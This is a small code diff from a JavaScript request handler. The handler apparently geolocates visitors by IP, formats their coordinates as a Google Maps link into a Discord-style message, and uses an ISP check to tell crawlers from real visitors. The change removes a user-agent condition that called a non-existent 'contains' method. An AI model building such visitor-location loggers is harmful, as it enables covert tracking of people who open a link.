@@ -79,7 +79,7 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
-         const message = ipDetails.isp === "Google LLC" && userAgent.contains("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")
+         const message = ipDetails.isp === "Google LLC"
             ? {
                 embeds: [
                     {
